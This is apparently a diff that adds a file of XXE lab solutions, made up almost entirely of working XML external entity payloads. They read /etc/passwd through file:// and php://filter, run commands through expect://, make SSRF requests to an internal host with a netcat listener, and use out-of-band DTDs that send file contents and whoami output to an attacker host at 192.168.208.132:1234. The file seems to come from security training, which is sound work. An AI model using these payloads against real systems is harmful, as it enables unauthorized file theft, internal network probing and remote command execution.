@@ -1,0 +1,79 @@
+XXE LAB SOLUTIONS
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE bo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+<root>
+<name>pippo</name>
+<tel>pluto</tel>
+<email>&xxe;</email>
+<password>pippo</password>
+</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE bo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<root>
+<name>pippo</name>
+<tel>pluto</tel>
+<email>&xxe;</email>
+<password>pippo</password>
+</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE bo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=expect://ls" >]>
+<root>
+<name>pippo</name>
+<tel>pluto</tel>
+<email>&xxe;</email>
+<password>pippo</password>
+</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE bo [<!ENTITY xxe SYSTEM "expect://ls" >]>
+<root>
+<name>pippo</name>
+<tel>pluto</tel>
+<email>&xxe;</email>
+<password>pippo</password>
+</root>
+
+#SSRF
+
+sudo nc -lnvp 80
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE bo [<!ENTITY xxe SYSTEM "http://192.168.208.132/reset_password.php" >]>
+<root>
+<name>pippo</name>
+<tel>pluto</tel>    
+<email>&xxe;</email>
+<password>pippo</password>
+</root>
+
+#BLIND
+
+(comment out the print)
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE bo [
+<!ELEMENT non_importa ANY>
+<!ENTITY % req SYSTEM "http://192.168.208.132/bo.dtd">
+%req;
+%minnie;
+]>
+<non_importa>
+&duffyduck;
+</non_importa>
+
+#bo.dtd
+<!ENTITY % pippo SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % minnie "<!ENTITY duffyduck SYSTEM 'http://192.168.208.132:1234/?command_result=%pippo;'>">
+
+#bo.rce.dtd
+<!ENTITY % pippo SYSTEM "php://filter/convert.base64-encode/resource=expect://whoami">
+<!ENTITY % minnie "<!ENTITY duffyduck SYSTEM 'http://192.168.208.132:1234/?command_result=%pippo;'>">
+
+
+
+
+
